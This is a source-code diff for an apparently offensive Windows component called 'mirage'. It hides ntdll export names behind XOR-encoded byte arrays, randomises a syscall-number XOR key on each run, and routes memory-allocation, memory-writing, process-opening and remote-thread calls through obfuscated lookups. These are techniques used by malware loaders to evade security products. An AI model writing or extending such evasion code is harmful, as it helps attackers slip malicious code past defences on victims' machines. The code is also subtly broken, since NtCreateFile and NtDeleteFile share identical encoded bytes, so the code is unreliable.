@@ -160,11 +160,14 @@ static void obf(void) {
         &ssn_NtFlushInstructionCache, &ssn_NtUserGetSystemMetrics,
     };
     for (uint32_t i=0; i<sizeof(p)/sizeof(p[0]); i++)
-        *p[i] ^= MIRAGE_SSN_XOR_KEY;
+        *p[i] ^= ssn_xor_key;
 }
 
 
 int mirage_syscall_resolve(void) {
+    /* Generate dynamic SSN XOR key per-run */
+    ssn_xor_key = MIRAGE_SEED ^ (uint32_t)GetTickCount();
+
     uint32_t h = mirage_encrypted_hash_module("ntdll.dll");
     void* ntdll = mirage_get_module_by_hash(h);
     if (!ntdll) { g_use_fallback = 1; return 0; }
@@ -277,7 +280,41 @@ int mirage_init_gadget_pool(void) {
     return 1;
 }
 
-/* ═══════ Nt* WRAPPERS — fallback to ntdll.dll imports ═══════ */
+/* ═══════ Global SSN XOR key (set at runtime) ═══════════════════ */
+uint32_t ssn_xor_key = 0xA3B5C7D9;
+
+/* ═══════ XOR-obfuscated export names ══════════════════════════ */
+
+static const unsigned char _NtAllocateVirtualMemory_obf[23] = { 0x01, 0x19, 0x24, 0x0b, 0x0d, 0x4f, 0x30, 0x15, 0x11, 0x04, 0x3a, 0x0c, 0x00, 0x54, 0x3e, 0x24, 0x23, 0x20, 0x00, 0x0a, 0x0e, 0x52, 0x2a };
+static const unsigned char _NtProtectVirtualMemory_obf[22] = { 0x01, 0x19, 0x35, 0x15, 0x0e, 0x54, 0x36, 0x17, 0x11, 0x37, 0x05, 0x17, 0x06, 0x55, 0x2a, 0x29, 0x02, 0x08, 0x08, 0x08, 0x13, 0x59 };
+static const unsigned char _NtFreeVirtualMemory_obf[19] = { 0x01, 0x19, 0x23, 0x15, 0x04, 0x45, 0x05, 0x1d, 0x17, 0x15, 0x19, 0x04, 0x1e, 0x6d, 0x2e, 0x28, 0x20, 0x1f, 0x1c };
+static const unsigned char _NtWriteVirtualMemory_obf[20] = { 0x01, 0x19, 0x32, 0x15, 0x08, 0x54, 0x36, 0x22, 0x0c, 0x13, 0x18, 0x10, 0x13, 0x4c, 0x06, 0x20, 0x22, 0x02, 0x17, 0x1e };
+static const unsigned char _NtReadVirtualMemory_obf[19] = { 0x01, 0x19, 0x37, 0x02, 0x00, 0x44, 0x05, 0x1d, 0x17, 0x15, 0x19, 0x04, 0x1e, 0x6d, 0x2e, 0x28, 0x20, 0x1f, 0x1c };
+static const unsigned char _NtClose_obf[7] = { 0x01, 0x19, 0x26, 0x0b, 0x0e, 0x53, 0x36 };
+static const unsigned char _NtQuerySystemInformation_obf[24] = { 0x01, 0x19, 0x34, 0x12, 0x04, 0x52, 0x2a, 0x27, 0x1c, 0x12, 0x18, 0x00, 0x1f, 0x69, 0x25, 0x23, 0x20, 0x1f, 0x08, 0x06, 0x15, 0x49, 0x3c, 0x1a };
+static const unsigned char _NtQueryInformationProcess_obf[25] = { 0x01, 0x19, 0x34, 0x12, 0x04, 0x52, 0x2a, 0x3d, 0x0b, 0x07, 0x03, 0x17, 0x1f, 0x41, 0x3f, 0x2c, 0x20, 0x03, 0x35, 0x15, 0x0e, 0x43, 0x36, 0x07, 0x16 };
+static const unsigned char _NtDelayExecution_obf[16] = { 0x01, 0x19, 0x21, 0x02, 0x0d, 0x41, 0x2a, 0x31, 0x1d, 0x04, 0x0f, 0x10, 0x06, 0x49, 0x24, 0x2b };
+static const unsigned char _NtOpenFile_obf[10] = { 0x01, 0x19, 0x2a, 0x17, 0x04, 0x4e, 0x15, 0x1d, 0x09, 0x04 };
+static const unsigned char _NtWriteFile_obf[11] = { 0x01, 0x19, 0x32, 0x15, 0x08, 0x54, 0x36, 0x32, 0x0c, 0x0d, 0x09 };
+static const unsigned char _NtSetInformationProcess_obf[23] = { 0x01, 0x19, 0x36, 0x02, 0x15, 0x69, 0x3d, 0x12, 0x0a, 0x13, 0x01, 0x04, 0x06, 0x49, 0x24, 0x2b, 0x1f, 0x1f, 0x0a, 0x04, 0x04, 0x53, 0x20 };
+static const unsigned char _NtOpenKey_obf[9] = { 0x01, 0x19, 0x2a, 0x17, 0x04, 0x4e, 0x18, 0x11, 0x1c };
+static const unsigned char _NtQueryValueKey_obf[15] = { 0x01, 0x19, 0x34, 0x12, 0x04, 0x52, 0x2a, 0x22, 0x04, 0x0d, 0x19, 0x00, 0x39, 0x45, 0x32 };
+static const unsigned char _NtOpenProcess_obf[13] = { 0x01, 0x19, 0x2a, 0x17, 0x04, 0x4e, 0x03, 0x06, 0x0a, 0x02, 0x09, 0x16, 0x01 };
+static const unsigned char _NtCreateThreadEx_obf[16] = { 0x01, 0x19, 0x26, 0x15, 0x04, 0x41, 0x27, 0x11, 0x31, 0x09, 0x1e, 0x00, 0x13, 0x44, 0x0e, 0x3d };
+static const unsigned char _NtFlushInstructionCache_obf[23] = { 0x01, 0x19, 0x23, 0x0b, 0x14, 0x53, 0x3b, 0x3d, 0x0b, 0x12, 0x18, 0x17, 0x07, 0x43, 0x3f, 0x2c, 0x20, 0x03, 0x26, 0x06, 0x02, 0x48, 0x36 };
+static const unsigned char _NtCreateEvent_obf[13] = { 0x01, 0x19, 0x26, 0x15, 0x04, 0x41, 0x27, 0x11, 0x20, 0x17, 0x09, 0x0b, 0x06 };
+static const unsigned char _NtDeleteFile_obf[12] = { 0x01, 0x19, 0x21, 0x02, 0x0d, 0x45, 0x27, 0x11, 0x23, 0x08, 0x00, 0x00 };
+static const unsigned char _NtSetInformationFile_obf[20] = { 0x01, 0x19, 0x36, 0x02, 0x15, 0x69, 0x3d, 0x12, 0x0a, 0x13, 0x01, 0x04, 0x06, 0x49, 0x24, 0x2b, 0x09, 0x04, 0x09, 0x02 };
+static const unsigned char _NtCreateFile_obf[12] = { 0x01, 0x19, 0x26, 0x15, 0x04, 0x41, 0x27, 0x11, 0x23, 0x08, 0x00, 0x00 };
+static const unsigned char _ntdll_dll_obf[9] = { 0x21, 0x19, 0x01, 0x0b, 0x0d, 0x0e, 0x37, 0x18, 0x09 };
+
+static void deobf_str(const unsigned char *obf, size_t len, char *out) {
+    for (size_t i = 0; i < len; i++)
+        out[i] = (char)(obf[i] ^ MIRAGE_STRING_KEY_ENC[i % 16]);
+    out[len] = '\0';
+}
+
+#define RESOLVE_EXPORT_OBF(arr) resolve_export_obf(arr, sizeof(arr))
 
 typedef NTSTATUS (WINAPI *pNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG, SIZE_T*, ULONG, ULONG);
 typedef NTSTATUS (WINAPI *pNtProtectVirtualMemory)(HANDLE, PVOID*, SIZE_T*, ULONG, ULONG*);
@@ -304,11 +341,17 @@ typedef NTSTATUS (WINAPI *pNtCreateFile)(HANDLE*, ULONG, PVOID, PVOID, PVOID, UL
 static HMODULE g_ntdll = NULL;
 
 static void ensure_ntdll(void) {
-    if (!g_ntdll) g_ntdll = GetModuleHandleA("ntdll.dll");
+    if (!g_ntdll) {
+        char name[16];
+        deobf_str(_ntdll_dll_obf, 9, name);
+        g_ntdll = GetModuleHandleA(name);
+    }
 }
 
-static void* resolve_export(const char *name) {
+static void* resolve_export_obf(const unsigned char *obf, size_t len) {
     ensure_ntdll();
+    char name[128];
+    deobf_str(obf, (len < sizeof(name)) ? len : (sizeof(name) - 1), name);
     return (void*)GetProcAddress(g_ntdll, name);
 }
 
@@ -317,7 +360,7 @@ NTSTATUS mirage_NtAllocateVirtualMemory(HANDLE a, PVOID* b, ULONG c, SIZE_T* d, 
         return (NTSTATUS)NtAllocateVirtualMemory_stub((uint64_t)a,(uint64_t)b,c,(uint64_t)d,e,f);
     }
     static pNtAllocateVirtualMemory fn = NULL;
-    if (!fn) fn = (pNtAllocateVirtualMemory)resolve_export("NtAllocateVirtualMemory");
+    if (!fn) fn = (pNtAllocateVirtualMemory)resolve_export_obf(_NtAllocateVirtualMemory_obf, sizeof(_NtAllocateVirtualMemory_obf));
     return fn ? fn(a,b,c,d,e,f) : -1;
 }
 
@@ -326,7 +369,7 @@ NTSTATUS mirage_NtProtectVirtualMemory(HANDLE a, PVOID* b, SIZE_T* c, ULONG d, U
         return (NTSTATUS)NtProtectVirtualMemory_stub((uint64_t)a,(uint64_t)b,(uint64_t)c,d,(uint64_t)e);
     }
     static pNtProtectVirtualMemory fn = NULL;
-    if (!fn) fn = (pNtProtectVirtualMemory)resolve_export("NtProtectVirtualMemory");
+    if (!fn) fn = (pNtProtectVirtualMemory)resolve_export_obf(_NtProtectVirtualMemory_obf, sizeof(_NtProtectVirtualMemory_obf));
     return fn ? fn(a,b,c,d,e) : -1;
 }
 
@@ -335,7 +378,7 @@ NTSTATUS mirage_NtFreeVirtualMemory(HANDLE a, PVOID* b, SIZE_T* c, ULONG d) {
         return (NTSTATUS)NtFreeVirtualMemory_stub((uint64_t)a,(uint64_t)b,(uint64_t)c,d);
     }
     static pNtFreeVirtualMemory fn = NULL;
-    if (!fn) fn = (pNtFreeVirtualMemory)resolve_export("NtFreeVirtualMemory");
+    if (!fn) fn = (pNtFreeVirtualMemory)resolve_export_obf(_NtFreeVirtualMemory_obf, sizeof(_NtFreeVirtualMemory_obf));
     return fn ? fn(a,b,c,d) : -1;
 }
 
@@ -344,7 +387,7 @@ NTSTATUS mirage_NtWriteVirtualMemory(HANDLE a, PVOID b, PVOID c, SIZE_T d, SIZE_
         return (NTSTATUS)NtWriteVirtualMemory_stub((uint64_t)a,(uint64_t)b,(uint64_t)c,d,(uint64_t)e);
     }
     static pNtWriteVirtualMemory fn = NULL;
-    if (!fn) fn = (pNtWriteVirtualMemory)resolve_export("NtWriteVirtualMemory");
+    if (!fn) fn = (pNtWriteVirtualMemory)resolve_export_obf(_NtWriteVirtualMemory_obf, sizeof(_NtWriteVirtualMemory_obf));
     return fn ? fn(a,b,c,d,e) : -1;
 }
 
@@ -353,7 +396,7 @@ NTSTATUS mirage_NtReadVirtualMemory(HANDLE a, PVOID b, PVOID c, SIZE_T d, SIZE_T
         return (NTSTATUS)NtReadVirtualMemory_stub((uint64_t)a,(uint64_t)b,(uint64_t)c,d,(uint64_t)e);
     }
     static pNtReadVirtualMemory fn = NULL;
-    if (!fn) fn = (pNtReadVirtualMemory)resolve_export("NtReadVirtualMemory");
+    if (!fn) fn = (pNtReadVirtualMemory)resolve_export_obf(_NtReadVirtualMemory_obf, sizeof(_NtReadVirtualMemory_obf));
     return fn ? fn(a,b,c,d,e) : -1;
 }
 
@@ -362,7 +405,7 @@ NTSTATUS mirage_NtClose(HANDLE a) {
         return (NTSTATUS)NtClose_stub((uint64_t)a);
     }
     static pNtClose fn = NULL;
-    if (!fn) fn = (pNtClose)resolve_export("NtClose");
+    if (!fn) fn = (pNtClose)resolve_export_obf(_NtClose_obf, sizeof(_NtClose_obf));
     return fn ? fn(a) : -1;
 }
 
@@ -371,7 +414,7 @@ NTSTATUS mirage_NtQuerySystemInformation(ULONG a, PVOID b, ULONG c, ULONG* d) {
         return (NTSTATUS)NtQuerySystemInformation_stub(a,(uint64_t)b,c,(uint64_t)d);
     }
     static pNtQuerySystemInformation fn = NULL;
-    if (!fn) fn = (pNtQuerySystemInformation)resolve_export("NtQuerySystemInformation");
+    if (!fn) fn = (pNtQuerySystemInformation)resolve_export_obf(_NtQuerySystemInformation_obf, sizeof(_NtQuerySystemInformation_obf));
     return fn ? fn(a,b,c,d) : -1;
 }
 
@@ -380,7 +423,7 @@ NTSTATUS mirage_NtQueryInformationProcess(HANDLE a, ULONG b, PVOID c, ULONG d, U
         return (NTSTATUS)NtQueryInformationProcess_stub((uint64_t)a,b,(uint64_t)c,d,(uint64_t)e);
     }
     static pNtQueryInformationProcess fn = NULL;
-    if (!fn) fn = (pNtQueryInformationProcess)resolve_export("NtQueryInformationProcess");
+    if (!fn) fn = (pNtQueryInformationProcess)resolve_export_obf(_NtQueryInformationProcess_obf, sizeof(_NtQueryInformationProcess_obf));
     return fn ? fn(a,b,c,d,e) : -1;
 }
 
@@ -389,7 +432,7 @@ NTSTATUS mirage_NtDelayExecution(BOOLEAN a, LARGE_INTEGER* b) {
         return (NTSTATUS)NtDelayExecution_stub(a,(uint64_t)b);
     }
     static pNtDelayExecution fn = NULL;
-    if (!fn) fn = (pNtDelayExecution)resolve_export("NtDelayExecution");
+    if (!fn) fn = (pNtDelayExecution)resolve_export_obf(_NtDelayExecution_obf, sizeof(_NtDelayExecution_obf));
     return fn ? fn(a,b) : -1;
 }
 
@@ -398,7 +441,7 @@ NTSTATUS mirage_NtCreateFile(HANDLE* a, ULONG b, PVOID c, PVOID d, PVOID e, ULON
         return (NTSTATUS)NtCreateFile_stub((uint64_t)a,b,(uint64_t)c,(uint64_t)d,(uint64_t)e,f,g,h,i,(uint64_t)j,k);
     }
     static pNtCreateFile fn = NULL;
-    if (!fn) fn = (pNtCreateFile)resolve_export("NtCreateFile");
+    if (!fn) fn = (pNtCreateFile)resolve_export_obf(_NtCreateFile_obf, sizeof(_NtCreateFile_obf));
     return fn ? fn(a,b,c,d,e,f,g,h,i,j,k) : -1;
 }
 
@@ -407,7 +450,7 @@ NTSTATUS mirage_NtOpenFile(HANDLE* a, ULONG b, PVOID c, PVOID d, ULONG e, ULONG 
         return (NTSTATUS)NtOpenFile_stub((uint64_t)a,b,(uint64_t)c,(uint64_t)d,e,f);
     }
     static pNtOpenFile fn = NULL;
-    if (!fn) fn = (pNtOpenFile)resolve_export("NtOpenFile");
+    if (!fn) fn = (pNtOpenFile)resolve_export_obf(_NtOpenFile_obf, sizeof(_NtOpenFile_obf));
     return fn ? fn(a,b,c,d,e,f) : -1;
 }
 
@@ -416,7 +459,7 @@ NTSTATUS mirage_NtWriteFile(HANDLE a, HANDLE b, PVOID c, PVOID d, PVOID e, PVOID
         return (NTSTATUS)NtWriteFile_stub((uint64_t)a,(uint64_t)b,(uint64_t)c,(uint64_t)d,(uint64_t)e,(uint64_t)f,g,(uint64_t)h,(uint64_t)i);
     }
     static pNtWriteFile fn = NULL;
-    if (!fn) fn = (pNtWriteFile)resolve_export("NtWriteFile");
+    if (!fn) fn = (pNtWriteFile)resolve_export_obf(_NtWriteFile_obf, sizeof(_NtWriteFile_obf));
     return fn ? fn(a,b,c,d,e,f,g,h,i) : -1;
 }
 
@@ -425,7 +468,7 @@ NTSTATUS mirage_NtSetInformationProcess(HANDLE a, ULONG b, PVOID c, ULONG d) {
         return (NTSTATUS)NtSetInformationProcess_stub((uint64_t)a,b,(uint64_t)c,d);
     }
     static pNtSetInformationProcess fn = NULL;
-    if (!fn) fn = (pNtSetInformationProcess)resolve_export("NtSetInformationProcess");
+    if (!fn) fn = (pNtSetInformationProcess)resolve_export_obf(_NtSetInformationProcess_obf, sizeof(_NtSetInformationProcess_obf));
     return fn ? fn(a,b,c,d) : -1;
 }
 
@@ -434,7 +477,7 @@ NTSTATUS mirage_NtOpenKey(HANDLE* a, ULONG b, PVOID c) {
         return (NTSTATUS)NtOpenKey_stub((uint64_t)a,b,(uint64_t)c);
     }
     static pNtOpenKey fn = NULL;
-    if (!fn) fn = (pNtOpenKey)resolve_export("NtOpenKey");
+    if (!fn) fn = (pNtOpenKey)resolve_export_obf(_NtOpenKey_obf, sizeof(_NtOpenKey_obf));
     return fn ? fn(a,b,c) : -1;
 }
 
@@ -443,7 +486,7 @@ NTSTATUS mirage_NtQueryValueKey(HANDLE a, PVOID b, ULONG c, PVOID d, ULONG e, UL
         return (NTSTATUS)NtQueryValueKey_stub((uint64_t)a,(uint64_t)b,c,(uint64_t)d,e,(uint64_t)f);
     }
     static pNtQueryValueKey fn = NULL;
-    if (!fn) fn = (pNtQueryValueKey)resolve_export("NtQueryValueKey");
+    if (!fn) fn = (pNtQueryValueKey)resolve_export_obf(_NtQueryValueKey_obf, sizeof(_NtQueryValueKey_obf));
     return fn ? fn(a,b,c,d,e,f) : -1;
 }
 
@@ -452,7 +495,7 @@ NTSTATUS mirage_NtOpenProcess(HANDLE* a, ULONG b, PVOID c, PVOID d) {
         return (NTSTATUS)NtOpenProcess_stub((uint64_t)a,b,(uint64_t)c,(uint64_t)d);
     }
     static pNtOpenProcess fn = NULL;
-    if (!fn) fn = (pNtOpenProcess)resolve_export("NtOpenProcess");
+    if (!fn) fn = (pNtOpenProcess)resolve_export_obf(_NtOpenProcess_obf, sizeof(_NtOpenProcess_obf));
     return fn ? fn(a,b,c,d) : -1;
 }
 
@@ -461,7 +504,7 @@ NTSTATUS mirage_NtCreateThreadEx(HANDLE* a, ULONG b, PVOID c, HANDLE d, PVOID e,
         return (NTSTATUS)NtCreateThreadEx_stub((uint64_t)a,b,(uint64_t)c,(uint64_t)d,(uint64_t)e,(uint64_t)f,g,h,i,j,(uint64_t)k);
     }
     static pNtCreateThreadEx fn = NULL;
-    if (!fn) fn = (pNtCreateThreadEx)resolve_export("NtCreateThreadEx");
+    if (!fn) fn = (pNtCreateThreadEx)resolve_export_obf(_NtCreateThreadEx_obf, sizeof(_NtCreateThreadEx_obf));
     return fn ? fn(a,b,c,d,e,f,g,h,i,j,k) : -1;
 }
 
@@ -470,7 +513,7 @@ NTSTATUS mirage_NtFlushInstructionCache(HANDLE a, PVOID b, SIZE_T c) {
         return (NTSTATUS)NtFlushInstructionCache_stub((uint64_t)a,(uint64_t)b,c);
     }
     static pNtFlushInstructionCache fn = NULL;
-    if (!fn) fn = (pNtFlushInstructionCache)resolve_export("NtFlushInstructionCache");
+    if (!fn) fn = (pNtFlushInstructionCache)resolve_export_obf(_NtFlushInstructionCache_obf, sizeof(_NtFlushInstructionCache_obf));
     return fn ? fn(a,b,c) : -1;
 }
 
@@ -479,7 +522,7 @@ NTSTATUS mirage_NtCreateEvent(HANDLE* a, ULONG b, PVOID c, ULONG d, ULONG e) {
         return (NTSTATUS)NtCreateEvent_stub((uint64_t)a,b,(uint64_t)c,d,e);
     }
     static pNtCreateEvent fn = NULL;
-    if (!fn) fn = (pNtCreateEvent)resolve_export("NtCreateEvent");
+    if (!fn) fn = (pNtCreateEvent)resolve_export_obf(_NtCreateEvent_obf, sizeof(_NtCreateEvent_obf));
     return fn ? fn(a,b,c,d,e) : -1;
 }
 
@@ -488,7 +531,7 @@ NTSTATUS mirage_NtDeleteFile(PVOID a) {
         return (NTSTATUS)NtDeleteFile_stub((uint64_t)a);
     }
     static pNtDeleteFile fn = NULL;
-    if (!fn) fn = (pNtDeleteFile)resolve_export("NtDeleteFile");
+    if (!fn) fn = (pNtDeleteFile)resolve_export_obf(_NtDeleteFile_obf, sizeof(_NtDeleteFile_obf));
     return fn ? fn(a) : -1;
 }
 
@@ -497,7 +540,7 @@ NTSTATUS mirage_NtSetInformationFile(HANDLE a, PVOID b, PVOID c, ULONG d, ULONG 
         return (NTSTATUS)NtSetInformationFile_stub((uint64_t)a,(uint64_t)b,(uint64_t)c,d,e);
     }
     static pNtSetInformationFile fn = NULL;
-    if (!fn) fn = (pNtSetInformationFile)resolve_export("NtSetInformationFile");
+    if (!fn) fn = (pNtSetInformationFile)resolve_export_obf(_NtSetInformationFile_obf, sizeof(_NtSetInformationFile_obf));
     return fn ? fn(a,b,c,d,e) : -1;
 }
 
